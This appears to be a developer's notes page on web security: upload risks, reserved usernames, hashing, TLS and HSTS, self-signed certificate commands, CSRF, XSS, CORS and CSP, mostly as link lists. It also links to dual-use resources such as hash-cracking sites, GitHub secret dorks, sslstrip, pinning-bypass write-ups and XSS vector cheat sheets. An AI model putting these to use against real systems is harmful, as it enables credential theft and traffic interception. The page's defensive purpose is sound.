	* List of blacklisted types by MediaWiki [Manual talk:$wgMimeTypeBlacklist - MediaWiki](https://www.mediawiki.org/wiki/Manual_talk:$wgMimeTypeBlacklist#Default_changed_in_1.17)
	* [HTML/SVG/XML vulnerabilities](#htmlsvgxml-vulnerabilities)
- check upload file content:
	- [Secure user uploads and exploiting served user content](https://opensourcehacker.com/2013/07/31/secure-user-uploads-and-exploiting-served-user-content/)
	- [exploit - How should I serve untrusted / unsanitized documents (PDF, DOC, XLS) to end users over the web? - Information Security Stack Exchange](http://security.stackexchange.com/questions/11995/how-should-i-serve-untrusted-unsanitized-documents-pdf-doc-xls-to-end-user)
	- [Unrestricted File Upload - OWASP](https://www.owasp.org/index.php/Unrestricted_File_Upload)
	- [Assembla security exploit: session take over – Medium](https://medium.com/@yvoschaap/assembla-security-exploit-session-take-over-fca6697c095a#.2ukp7skia)
- A simple file/image can be used to attack using an out of bounds memory write
- image metadata can contains XSS scripts
	- [EXIF Cross Site Scripting, PHP Fun – Confessions Of A Dangerous Mind](http://www.sectorix.com/2013/12/02/exif-cross-site-scripting-php-fun/)
	- [Malware Hidden Inside JPG EXIF Headers](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)
- A simple archive or an image (PNG) can act as a bomb:
	- [Deflate Decompression Bomb](Deflate#Decompression Bomb)
	- [ZIP Decompression Bomb](ZIP#Decompression Bomb)
	- [PNG Decompression Bomb](PNG#Decompression Bomb)
	- [JPEG Bomb](JPEG#Decompression Bomb)
	- [Tarbomb](Tar#Tarbomb)
	
	Workaround: define size or max memory limits (`width * height > max_pixels_limit`)

#### Unsafe name

Name for: username, page name, application name, etc.

Remove diacritics, [normalize](http://www.unicode.org/reports/tr15/), replace [confusables](http://www.unicode.org/Public/security/6.3.0/confusables.txt). See ["use special chars or lookalike chars"](#obfuscation-code))

Don't allow (approve) name change too often

Don't allow famous brand or product (Apple, Google, Amazon, etc.) and lookalike typos Gooogle , Amezon, Facebok, etc.

When users can create an email address `***@domain.ext` with filtering the name like: admin, administrator, mailer-daemon, postmaster, hostmaster or webmaster

Forbid (rewrite) `robots.txt` as username: `domain.ext/username` (use `robots-txt`), `delete` as username `domain.ext/user/delete` (use `delete_username`)

- [Hostname and username to reserve](https://zimbatm.github.io/hostnames-and-usernames-to-reserve/)
- [GitHub i forcing me to change my username, and will not tell me why | Hacker News](https://news.ycombinator.com/item?id=16555451)
- [Microsoft takes 4 years to recover privileged TLS certificate addresses | Ars Technica](http://arstechnica.com/security/2015/03/microsoft-takes-4-years-to-recover-privileged-tls-certificate-addresses/)
- [People's Names That Break Websites | CSS-Tricks](https://css-tricks.com/peoples-names-break-websites/)
- [PSA: Two Different Developers, under the SAME NAME. : Android](https://www.reddit.com/r/Android/comments/7ahujw/psa_two_different_developers_under_the_same_name/)
- [FAQ - Normalization](http://unicode.org/faq/normalization.html)
- [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)

### Disposable email address

- [Disposable email address - Wikipedia](https://en.wikipedia.org/wiki/Disposable_email_address)
- [The Ultimate Disposable Email Provider List (2017 update)](https://www.ghacks.net/2012/05/31/the-ultimate-disposable-email-provider-list-2012/)
- [List of disposable email provider domains](https://gist.github.com/michenriksen/8710649)
- [A list of domains for disposable and temporary email addresses. Useful for filtering your email list to increase open rates (sending email to these domains likely will not be opened).](https://gist.github.com/adamloving/4401361)
- [Detect temporary mails - Block Disposable Email Addresses - IsTempMail](https://www.istempmail.com/)
- [List of temporary email domains as of 2018-02-06 and disposable email detection, fake user prevention](https://www.block-disposable-email.com/cms/)

### Hash and keys

**Never make your own cryptography library.**
**Hash: always use salt**

- [How data encryption software creates one way hash files using the sha1 hashing algorithm.](http://www.metamorphosite.com/one-way-hash-encryption-sha1-data-software)
- [Choosing the Right Cryptography Library for your PHP Project: A Guide - Paragon Initiative Enterprises Blog](https://paragonie.com/blog/2015/11/choosing-right-cryptography-library-for-your-php-project-guide)
- [Pure PHP polyfill for ext/sodium](https://github.com/paragonie/sodium_compat) - Polyfill for libsodium in PHP (libsodium is included by default in PHP 7.2)
- as3crypto
	Partial TLS 1.0 support, RSA,  AES, DES, 3DES, BlowFish, XTEA, RC4, MD2, MD5, SHA-1, SHA-224, SHA-256, etc.
	
	- http://code.google.com/p/as3crypto (official repo and issues)
	- https://github.com/timkurvers/as3-crypto (based on as3crypto 1.3)
	- https://github.com/lyokato/as3crypto_patched (based on as3crypto 1.3)
- [Stanford Javascript Crypto Library](https://github.com/bitwiseshiftleft/sjcl)
- [A modern and easy-to-use crypto library. ](https://github.com/jedisct1/libsodium)
- [ActionScript (AS3) library for processing binary data](https://github.com/blooddy/blooddy_crypto)
	MD5, SHA-1, SHA-2 ( SHA-224 и SHA-256 ), Base64, CRC32 algorithms, JSON encoder & decoder as well as PNG and JPEG encoders.
- [hash - SHA512 faster than SHA256? - Cryptography Stack Exchange](http://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256) Works only with implementation using 64-bit integer operations (not JS), see [SHA-512 is 1.5x faster than SHA-256 on 64-bit platforms | Hacker News](https://news.ycombinator.com/item?id=13547042)
- [Length extension attack — Wikipedia](https://en.wikipedia.org/wiki/Length_extension_attack)
- [Lifetimes of cryptographic hash functions](http://valerieaurora.org/hash.html)
- [Looks Like It - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/432-Looks-Like-It.html) and [Kind of Like That - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/529-Kind-of-Like-That.html) - perceptual hashes
- [Comparing -- IM v6 Examples](http://www.imagemagick.org/Usage/compare/#metric_perceptual_hash) - Perceptual Hash
- [Perceptual Hash - ImageMagick](https://www.imagemagick.org/discourse-server/viewtopic.php?t=25061)

Check hash and keys leak or reversed (hashes):

- [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
- [HashKiller.co.uk, Over 1.45387 trillion decrypted hashes in total, Free Hash Cracker, Online Hash Cracker](https://hashkiller.co.uk/)
- [Searches through git repositories for high entropy strings, digging deep into commit history](https://github.com/dxa4481/truffleHog)
- [Collection of github dorks and helper tool to automate the process of checking dorks](https://github.com/techgaun/github-dorks) (search for sensitive data on the repositories)
- [Detect secret leaks in Android Apps](https://android.fallible.co/)

Data checksum:

```sh
# SHA512
shasum -a 512 /path/to/file
openssl sha512 /path/to/file
# MD5
md5 /path/to/file
openssl md5 /path/to/file
```

Hash collision:

![PDF Sha1 Collision](Prevent%20violation/Hash%20and%20keys/PDF%20sha1%20collision.jpg)

- [Google Online Security Blog: Announcing the first SHA1 collision](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html) and [SHAttered](https://shattered.it/)
- [sha1collisiondetection](https://github.com/cr-marcstevens/sha1collisiondetection) - Library and command line tool to detect SHA-1 collision in a file
- https://github.com/nneonneo/sha1collider - Build two PDFs that have different content but identical SHA1 sums
- [Nat McHugh: How I created two images with the same MD5 hash](https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html)
	and [Nat McHugh: Three way MD5 collision](https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html)
- [Project HashClash - Project HashClash](https://marc-stevens.nl/p/hashclash/)
	- [cr-marcstevens/hashclash: Project HashClash - MD5 & SHA-1 cryptanalysis](https://github.com/cr-marcstevens/hashclash)
	- [hashclash-old-svn-repo/downloads at master · cr-marcstevens/hashclash-old-svn-repo](https://github.com/cr-marcstevens/hashclash-old-svn-repo/tree/master/downloads)
	- [Chosen-prefix Collisions](http://www.win.tue.nl/hashclash/ChosenPrefixCollisions/)
	- [Marc Stevens - Research](https://marc-stevens.nl/research/)

### Data scraping

- [The ultimate guide on preventing Website Scraping](https://github.com/JonasCz/How-To-Prevent-Scraping)
- [Web scraping — Wikipedia](https://en.wikipedia.org/wiki/Web_scraping)
- [html - How do I prevent site scraping? - Stack Overflow](https://stackoverflow.com/questions/3161548/how-do-i-prevent-site-scraping/34828465#34828465)

See [Web scrapping](../Data/Web%20scrapping/Web%20scrapping.md)

### Know your weaknesses

See [Vulnerabilities](#vulnerabilities)

**… and solve it!**

- [Security Tips - Apache HTTP Server Version 2.4](https://httpd.apache.org/docs/2.4/en/misc/security_tips.html)
- [httpd 2.2 vulnerabilities - The Apache HTTP Server Project](https://httpd.apache.org/security/vulnerabilities_22.html)
- [httpd 2.4 vulnerabilities - The Apache HTTP Server Project](https://httpd.apache.org/security/vulnerabilities_24.html)
- https://httpd.apache.org/security/vulnerabilities-httpd.xml

Make [pentest / penetration test](https://en.wikipedia.org/wiki/Penetration_test), create a [bug bounty program](https://en.wikipedia.org/wiki/Bug_bounty_program)

- [Penetration Testing Software | Metasploit](https://www.metasploit.com/)
- [enaqx/awesome-pentest: A collection of awesome penetration testing resources, tools and other shiny things](https://github.com/enaqx/awesome-pentest)

### Man of the middle

> Why are people surprised that having a service MITM your TLS traffic creates an point of exposure?
— Aaron Beuhring

- HTTPS (TLS), HPKP
- postmessage third part window for validate and generate encypted data (like a client and server), require an extra tab be always opened
- Encrypt data on server too: [Mylar](http://css.csail.mit.edu/mylar/)
- Allow to verify public keys IRL: [Open Whisper Systems >> Blog >> WhatsApp's Signal Protocol integration is now complete](https://www.whispersystems.org/blog/whatsapp-complete/)

It's possible to make calculation on encrypted data using [Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption).

- [Zero-knowledge proof — Wikipedia](https://en.wikipedia.org/wiki/Zero-knowledge_proof)
- [The Netflix Tech Blog: Message Security Layer: A Modern Take on Securing Communication](http://techblog.netflix.com/2014/10/message-security-layer-modern-take-on.html)
- [Message Security Layer](https://github.com/Netflix/msl)

#### Transport Layer Security

Aka TLS

See also [Client Certificate](#client-certificate)

TLS JavaScript Implementation

- [digitalbazaar/forge: A native implementation of TLS in Javascript and tools to write crypto-based and network-heavy webapps](https://github.com/digitalbazaar/forge)
- [A JavaScript Implementation of TLS (Part 1/2) « Digital Bazaar](http://digitalbazaar.com/2010/07/20/javascript-tls-1/) and [A JavaScript Implementation of TLS (Part 2/2) « Digital Bazaar](http://digitalbazaar.com/2010/07/20/javascript-tls-2/)
- [Moxie Marlinspike \>> Software >> sslstrip](https://moxie.org/software/sslstrip/)

**Never mix HTTP and HTTPS, because HTTP parts can be compromised, even in navigation (page 1 HTTP -> page 2 HTTPS, via link, form or redirection).** Use [CSP](#content-security-policy) `block-all-mixed-content` or `upgrade-insecure-requests`.

Note: Root certificate can be compromises (by a malware, by the manufacturer, etc.) on the client machine.

- [SSL Server Test (Powered by Qualys SSL Labs)](https://www.ssllabs.com/ssltest/)
- [HTTPS encryption on the web – Google Transparency Report](https://transparencyreport.google.com/https/certificates?cert_search_auth=&cert_search_cert=&cert_search=include_expired:true;include_subdomains:false&lu=cert_search)
- [Reparlons de Let’s Encrypt - LinuxFr.org](https://linuxfr.org/news/reparlons-de-let-s-encrypt#lauthentification-http-01)
- [Challenge Types - Let's Encrypt - Free SSL/TLS Certificates](https://letsencrypt.org/docs/challenge-types/)
- [Transport Layer Security — Wikipedia](https://en.wikipedia.org/wiki/Transport_Layer_Security)
- [Public key cryptography - Diffie-Hellman Key Exchange](Public%20key%20cryptography%20-%20Diffie-Hellman%20Key%20Exchange%20%28full%20version%29%20%28480p%29.mp4)
- [PinPatrol :: Add-ons for Firefox](https://addons.mozilla.org/en-US/firefox/addon/pinpatrol/) shows HSTS and HPKP domains stored by the browser
- [Certificate and Public Key Pinning - OWASP](https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning)
- [HTTP Strict Transport Security - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security) and [HSTS Preload Submission](https://hstspreload.appspot.com/)
- [HTTP Public Key Pinning - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning)
- [Robert Love · Blog: Everything you Need to Know about HTTP Public Key Pinning (HPKP)](http://blog.rlove.org/2015/01/public-key-pinning-hpkp.html)
- [Cool Solutions: Decrypting SSL Traffic to Troubleshoot NAM](http://www.novell.com/coolsolutions/appnote/19321.html)
- [The First Few Milliseconds of an HTTPS Connection](http://www.moserware.com/2009/06/first-few-milliseconds-of-https.html)
- [A basic guide to when and how to deploy HTTPS — Erik Romijn](http://erik.io/blog/2013/06/08/a-basic-guide-to-when-and-how-to-deploy-https/)
- [5 easy tips to accelerate SSL – Unhandled expression](https://unhandledexpression.com/2013/01/25/5-easy-tips-to-accelerate-ssl/)
- [cryptography - "Diffie-Hellman Key Exchange" in plain English - Information Security Stack Exchange](http://security.stackexchange.com/questions/45963/diffie-hellman-key-exchange-in-plain-english/45971)
- [Nick Craver - HTTPS on Stack Overflow: The End of a Long Road](https://nickcraver.com/blog/2017/05/22/https-on-stack-overflow/)
- [HTTPS : de SSL à TLS 1.3 | Openweb.eu.org](https://openweb.eu.org/articles/https-de-ssl-a-tls-1-3)
- [How to Use SSL/TLS with Node.js — SitePoint](https://www.sitepoint.com/how-to-use-ssltls-with-node-js/)
- [Understanding the Limitations of HTTPS | text/plain](https://textslashplain.com/2018/02/14/understanding-the-limitations-of-https/)
- [Still think you don't need HTTPS?](https://scotthelme.co.uk/still-think-you-dont-need-https/)
- [Why do we need HTTPS? - How HTTPS works](https://howhttps.works/why-do-we-need-https/)

##### Self-signed certificate

Create an self-signed certificate (SSC)

```sh
# Create self signed certificate for 10 years (no use shorter validity for production):
# Inline openssl extension config file:
openssl req -newkey rsa:4096 -x509 -days 3650 -sha256 -config <(echo -e "[req]\ndistinguished_name=dn\n[dn]\n[ext]\nbasicConstraints=CA:false\nsubjectAltName=DNS:*.domain.com") -extensions ext -nodes -subj "/C=FR/ST=IDF/L=Paris/O=ACME/OU=Development/CN=*.domain.com/emailAddress=admin@domain.com" -keyout .domain.com.key -out .domain.com.crt
# For subjectAltName syntax see http://blog.endpoint.com/2013/10/ssl-certificate-sans-and-multi-level.html
# subjectAltName=DNS=*.domain.com
# -subj ".../.../subjectAltName=DNS.1=example.com, DNS.2=www.example.com, DNS.3=billing.example.com"
```

```sh
# Read certificate
openssl x509 -text -noout -in domain.ext.crt
```

`-nodes` (no DES): the created private key is it will not be encrypted. Usefull on a webserver. Else it require after each reboot to provide or store the password to decrypt the private key.

Self-signed CA vs self-signed certificate:

- self-signed certificate. Install it in the root keystore of the client and the server use it.
- self-signed CA certificate (Certifying Authority certificate, require [X.509 Basic Constraints](https://tools.ietf.org/html/rfc5280#section-4.2.1.9) `CA=TRUE`), used to sign a certificate (end entity cert). Install the root cert in the root keystore of the client and the server use the entity cert.
- self-signed CA certificate, signed intermediate certificate and a end-entity cert.

Note: Android require Basic constraints extension ("CA flag") to be set to `TRUE`.
Note: Chrome 58 and Firefox 48 require Subject Alternative Name (SAN) (`subjectAltName`) for the domain(s) name(s), to define all domains used by this certificate

<details>
<summary>
How to create a trusted certificate on Windows
</summary>
	
Create a trusted certificate:

1. open "Microsoft Management Console (MMC)" (Run/Win+R "mmc", then OK)
2. if required:
	1. click "File > Add/Remove Snap-in"
	2. select "Certificats", click "Add >"
	3. select "Computer Account"
	4. click "Next" then "Finish" then "OK"
3. expand "Certificates (Local Computer) > Personal > Certificates" and right click on it, then "All Tasks > Advanced Operations > Create Custom Request..."
4. click "Next"
5. select "Proceed without enrollment policy", click "Next"
6. click "Next" (keep default: template "(No template) CNG Key", and request format "PCKS #10")
7. click "Details", "Properties"
8. set "Friendly name", like your computer name or `mydevice.local`
9. in "Subject" tab:
	1. in subject name, select "Common name" and set the value to `mydevice.local`, then click "Add >"
	2. in alternative name, select "DNS" ans set the value to `mydevice.local`, then click "Add >"
	3. in alternative name, select "DNS" ans set the value to `*.example.com`, then click "Add >"
10. in "Extensions" tab:
	1. in "Extended Key Usage (application policies)" section, select "Server Authentification", then click "Add >"
	2. in "Basic Constraints" section, check "Enable this extension"
11. in "Private Key" tab:
	1. in "Key options" section, check "Make private key exportable"
	2. in "Select Hash Algorithm" section, choose a "Hash Algorithm" (use SHA-2: sha256, sha384 or sha512)
12. click "OK", "Next"
13. browser and set a file name
14. in "Certificate Enrollment Requests > Certificats", select the created certificate and cut
15. past it in "Personnal > Certificates" and copy + past it in "Trusted Root Certification Authorities > Certificates"

If you want to trust that certificate on other machine, on the server machine:

1. open MMC
2. in "Personnal > Certificates", select the certificate and open it
3. in "Details" tab, click "Copy to File", "Next", "Next", select the right format

On each client machine:

1. open MMC
2. in "Trusted Root Certification Authorities > Certificates", "Other actions > All tasks > Import..."
3. click "Next", select the certificate file
4. click "Next", check is the certificate store is "Trusted Root Certification Authorities"
5. click "Finish"

</details>

- mkcert:
    - [FiloSottile/mkcert: A simple zero-config tool to make locally trusted development certificates with any names you'd like.](https://github.com/FiloSottile/mkcert)
    - [mkcert: valid HTTPS certificates for localhost](https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/) (*.localhost domains)
- [Certificates for localhost - Let's Encrypt - Free SSL/TLS Certificates](https://letsencrypt.org/docs/certificates-for-localhost/#making-and-trusting-your-own-certificates)
- [ssl - Difference between self-signed CA and self-signed certificate - Stack Overflow](https://stackoverflow.com/questions/4024393/difference-between-self-signed-ca-and-self-signed-certificate)
- [Self-signed SSL certificates, CA flagged true, for Android and OS X | Best Mac Tips](http://best-mac-tips.com/2015/05/28/self-signed-ssl-certificates-ca-true-android-os-x/)
- [Des certificats signés par votre autorité de certification avec OpenSSL - Jeyg.info](http://jeyg.info/des-certificats-signes-par-votre-autorite-de-certification-avec-openssl/)
- [OpenSSL CA and non CA certificate - Super User](https://superuser.com/questions/462295/openssl-ca-and-non-ca-certificate)
- [OpenSSL (Keys and Certificates) · HOWTO setup a small server · Ch. Schneider](http://chschneider.eu/linux/server/openssl.shtml)
- [certificates - SSL/TLS: Policy Constraints vs. Basic Constraints - Information Security Stack Exchange](https://security.stackexchange.com/questions/110686/ssl-tls-policy-constraints-vs-basic-constraints)
- [A Web PKI x509 certificate primer - Mozilla | MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Security/x509_Certificates)
- [ssl - How to create a self-signed certificate with openssl? - Stack Overflow](https://stackoverflow.com/questions/10175812/how-to-create-a-self-signed-certificate-with-openssl/27931596#27931596)
- [OpenSSL man page: req](https://www.openssl.org/docs/manmaster/man1/req.html)
- [Chrome: Invalid self signed SSL cert - "Subject Alternative Name Missing" - Stack Overflow](https://stackoverflow.com/questions/43665243/chrome-invalid-self-signed-ssl-cert-subject-alternative-name-missing)
- [Fixing Chrome 58+ \[missing_subjectAltName\] with openssl when using self signed certificates | Alexander Zeitler](https://alexanderzeitler.com/articles/Fixing-Chrome-missing_subjectAltName-selfsigned-cert-openssl/)
- [FAQ/subjectAltName - CAcert Wiki](http://wiki.cacert.org/FAQ/subjectAltName)
- [CertSimple | Your OpenSSL CSR command is out of date](https://certsimple.com/blog/openssl-csr-command)
- [CertSimple | Never see localhost HTTPS warnings again](https://certsimple.com/blog/localhost-ssl-fix)
- [How to Setup HTTPS Locally Without Getting Annoying Browser Privacy Errors](https://deliciousbrains.com/https-locally-without-browser-privacy-errors/)
- [How to get HTTPS working on your local development environment in 5 minutes](https://medium.freecodecamp.org/how-to-get-https-working-on-your-local-development-environment-in-5-minutes-7af615770eec)
- [SHA-256 Self Signed Certificate for Windows Server 2012 R2 – Mayur's Blog](https://blogs.msdn.microsoft.com/mayurpatankar/2017/09/01/sha-256-self-signed-certificate-for-windows-server-2012-r2/)

##### HTTP Strict Transport Security

Aka HSTS

Force TLS (HTTPS), in `.htaccess`:

```apache
 2 years
Header always set Strict-Transport-Security "max-age=63072000; includeSubdomains; preload"
```

Should redirect HTTP to HTTPS first, then the browser remember it.

- [HTTP Strict Transport Security — Wikipedia](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
- [HTTP Strict Transport Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet)
- [Strict-Transport-Security - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [HSTS](htaccess#hsts)
- [How to clear HSTS Settings in Major Browsers | that's so … classically.me](http://classically.me/blogs/how-clear-hsts-settings-major-browsers) - Chrome / Opera: `chrome://net-internals/#hsts`, Safari: `~/Library/Cookies/HSTS.plist`, Firefox `%firefox_profile%/SiteSecurityServiceState.txt`

Firefox:

- Regular browsing mode: HSTS persists across sessions.
- Private browsing mode: HSTS information are deleted after the session.

##### Decrypt TLS

`SSLKEYLOGFILE`
`sudo tcpdump -i en0 -s 0 tcp port https -w ~/Desktop/capture.pcap`
Chrome [`--ssl-key-log-file=file`](https://peter.sh/experiments/chromium-command-line-switches/#ssl-key-log-file)

- [NSS Key Log Format - Mozilla | MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Key_Log_Format)
- [Decrypting TLS Browser Traffic With Wireshark – The Easy Way! | Jim Shaver](https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/)
- [TLS Master Secrets — mitmproxy 2.0.2 documentation](https://mitmproxy.readthedocs.io/en/v2.0.2/dev/sslkeylogfile.html)
- [Inspect curl’s TLS traffic | daniel.haxx.se](https://daniel.haxx.se/blog/2018/01/15/inspect-curls-tls-traffic/)
- [SSL key logging (aka SSLKEYLOGFILE) – Welcome to the Windows developer feedback site!](https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/16310230-ssl-key-logging-aka-sslkeylogfile)
- [Article: K10209 - Overview of packet tracing with the ssldump utility](https://support.f5.com/csp/article/K10209)
- [Chrome not Firefox are not dumping to SSLKEYLOGFILE variable - Stack Overflow](https://stackoverflow.com/questions/42332792/chrome-not-firefox-are-not-dumping-to-sslkeylogfile-variable)
- [CertPinning - Fiddler](http://fiddler.wikidot.com/certpinning)
- [Bypassing OpenSSL Certificate Pinning in iOS Apps](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/january/bypassing-openssl-certificate-pinning-in-ios-apps/) - Doesn't work on recent iOS versions

### Cookie-to-Header Token

**It's based on the assumption that only JavaScript running within the same origin will be able to read the cookie's value.**

```js
fetch(url, {
	credentials: "include",
	mode: "cors",
	headers: {
		"Accept": "application/json",
		"X-Csrf-Token": getCookieValue("Csrf-token")
	}
});
```

- [Cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Cookie-to-Header_Token)

### XSS and injection prevention

For HTML, use:

- `crossorigin` attribute for [`<script>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-crossorigin), [`<img>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#attr-crossorigin)
- `noopener`
- `Content-Security-Policy: frame-ancestors 'self'` header (or the depreciated `X-Frame-Options: SAMEORIGIN`)
- `X-Content-Type-Options: nosniff` header (discard content detection = use only `Content-Type` header)
- [Subresource Integrity](#subresource-integrity)
- [Content Security Policy](#content-security-policy)
- [Cross-Origin Resource Sharing](#cross-origin-resource-sharing)
- use `SameSite=Strict` cookies

- add a timestamp (use it also to create the "nonce") and check the diff time (depends how much input number is), a user require a minimum of few seconds
- Other prevention techniques [Cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)
- use a [nonce](https://en.wikipedia.org/wiki/Cryptographic_nonce) (see Wordpress `wp_create_nonce()`) field to protect against CSRF (Cross-Site Request Forgery)
- [Cookies for Comments — WordPress Plugins](https://wordpress.org/plugins/cookies-for-comments/)
- (require cookies) add unique image/js/css resource (`<script src="script.php?UNIQ_ID"></script>`), when this resource is called add a cookie. When the form is POST, check if the cookie exist

About XSS and service workers:

- [XSS with ServiceWorkers · Learning Man](https://blog.sari3l.com/posts/a62f29f1/)
- [RootkitXSS之ServiceWorker - 先知社区](https://xz.aliyun.com/t/3228)
- [ServiceWorker is dangerous](https://alf.nu/ServiceWorker)
- [Frederik Braun : Challenge Write-up: Subresource Integrity in Service Workers](https://frederik-braun.com/sw-sri-challenge.html)

For JSON, use (affect only old browsers):

- proper headers: `Content-Type: application/json` and `x-content-type-options: nosniff`
- [AJAX Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet#Protect_against_JSON_Hijacking_for_Older_Browsers)
- [jquery - Is it possible to XSS exploit JSON responses with proper JavaScript string escaping - Stack Overflow](https://stackoverflow.com/questions/3146324/is-it-possible-to-xss-exploit-json-responses-with-proper-javascript-string-escap)
- prefix with `for(;;);` or `)]}'`
- [Polyglot JSON - JS file](#polyglot-json---js-file)

See also

- [Polyglot HTML - JPEG file](#polyglot-html---jpeg-file)
- [DOM clobbering](#dom-clobbering)
- [Cross-site scripting — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [Link types - HTML | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types)
- [Source-Breaking Injections - Fooling the Interpreter](http://brutelogic.com.br/blog/source-breaking-injections/)
- [Things to Know (and Potential Dangers) with Third-Party Scripts | CSS-Tricks](https://css-tricks.com/potential-dangers-of-third-party-javascript/)
- [javascript - Could anyone explain these XSS test strings? - Stack Overflow](https://stackoverflow.com/questions/25461418/could-anyone-explain-these-xss-test-strings)
- [ArticlesXSS - doctype-mirror - Articles about web security - Mirror of Google Doctype - Google Project Hosting](https://code.google.com/p/doctype-mirror/wiki/ArticlesXSS)
- [php - Is json_encode Sufficient XSS Protection? - Stack Overflow](https://stackoverflow.com/questions/12062146/is-json-encode-sufficient-xss-protection)
- [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC)
- `SameSite` cookies CSRF tokens [GitHub’s post-CSP journey - GitHub Engineering](https://githubengineering.com/githubs-post-csp-journey/#same-site-cookies)
- Prevention of [cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)
- [Cryptographic nonce — Wikipedia](https://en.wikipedia.org/wiki/Cryptographic_nonce) (see Wordpress `wp_create_nonce()`)
- [Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet)
- [Same-origin policy — Wikipedia](https://en.wikipedia.org/wiki/Same-origin_policy)
- [Same-origin policy - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/)
- [s0md3v/XSStrike: Most advanced XSS detection suite.](https://github.com/s0md3v/XSStrike)1
- [The British Airways Breach: How Magecart Claimed 380,000 Victims](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/) - [Card-stealing code that pwned British Airways, Ticketmaster pops up on more sites via hacked JS • The Register](https://www.theregister.co.uk/2018/09/12/feedify_magecart_javascript_library_hacked/), [Magecart – Darknet Diaries](https://darknetdiaries.com/episode/52/)

#### Subresource Integrity

Use `integrity` attribute for `<script>` and `<link>`

- [Subresource Integrity](https://www.w3.org/TR/SRI/)
- [Subresource Integrity - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)

#### Cross-Origin Resource Sharing

Aka CORS

> It's safe to put `Access-Control-Allow-Origin: *` on any response, *unless* that response's data is 'secured' by something other than cookies, basic auth, or TLS client certificates.
> Exception: Content that's 'protected' by the requester's IP. Eg geo-locked data, or extra debug data that might appear if the request is from an 'internal' IP.
> Exception: Content that's 'protected' by being on an internal network. Eg intranets, iot devices, local servers (although these should all be secured another way).
> These are exceptions because they would allow an attacker who was outside the internal network, or didn't have the correct IP, to use an 'inside' user as a proxy.
> [...]
> > Exception: fetch with credentials doesn’t allow wildcards, for whatever reason.
> That's why it's safe to add to all resources
> — [Jake Archibald on Twitter: "PSA: It's safe to put "Access-Control-Allow-Origin: *" on any response, *unless* that response's data is 'secured' by something other than cookies, basic auth, or TLS client certificates." / Twitter](https://twitter.com/jaffathecake/status/1222071269962715141)

Note: Be carefull and don't mix `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` without know what your are doing

`Access-Control-Allow-Origin: *` means [“anonymous requests only”](https://w3c.github.io/webappsec-cors-for-developers/#anonymous-requests-or-access-control-allow-origin)

- [HTTP access control (CORS) - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)
- [Using CORS - HTML5 Rocks](http://www.html5rocks.com/en/tutorials/cors/)
- [Cross-Origin Resource Sharing](https://www.w3.org/TR/cors/)
- [cors - What exactly does the Access-Control-Allow-Credentials header do? - Stack Overflow](https://stackoverflow.com/questions/24687313/what-exactly-does-the-access-control-allow-credentials-header-do/24689738#24689738)
- https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_settings_attributes
- [Using CORS policies to implement CSRF protection | Mixmax Engineering Blog](https://mixmax.com/blog/modern-csrf)
- [the frontendian](https://frontendian.co/cors)
- [Do You Really Know CORS? – PerformantCode.com](http://performantcode.com/web/do-you-really-know-cors)

#### Content Security Policy

Aka CSP

**Note: URIs in directives sources can't contains `;` nor `,`**

Facebook CSP example:

```http
Content-Security-Policy: default-src * data: blob:;script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' fbstatic-a.akamaihd.net fbcdn-static-b-a.akamaihd.net *.atlassolutions.com blob: data: chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl;style-src * 'unsafe-inline' data:;connect-src *.facebook.com *.fbcdn.net *.facebook.net *.spotilocal.com:* *.akamaihd.net wss://*.facebook.com:* https://fb.scanandcleanlocal.com:* *.atlassolutions.com attachment.fbsbx.com ws://localhost:* blob: 127.0.0.1:*;
```

